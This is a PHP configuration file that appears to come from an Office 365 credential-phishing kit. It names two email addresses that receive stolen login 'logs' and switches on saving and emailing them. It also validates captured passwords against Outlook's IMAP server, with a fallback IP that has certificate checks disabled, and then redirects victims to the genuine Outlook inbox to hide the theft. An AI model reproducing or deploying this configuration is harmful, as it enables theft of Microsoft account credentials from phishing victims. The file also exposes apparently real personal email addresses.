<?php
$recipient ="van.kers@yandex.com,daniel.stephenn@gmail.com"; // your email
$password = '123'; // PASSWORD TO DECRYPT, CAN BE CHANGED
$savelog=true; // save logs to cpanel
$sendlog=true; // send logs to email
$truelogin=true; // enable / disable true login
$One_Time_Access=1; // ONE TIME ACCESS
$api1= "{outlook.office365.com:993/ssl}"; // active action api, if this fails copy api2 to api1
$api2= "{40.101.54.2:993/imap/ssl/novalidate-cert}INBOX"; // this is the vienna office domain to ip converted 40.101.54.2 works if the above fails
$over = 'https://outlook.office.com/mail/inbox'; // the finish url, you can change or use the logout link below
// https://login.microsoftonline.com/3b5c2832-4b4d-4b6a-aa14-ffb05086b26c/oauth2/logout
?>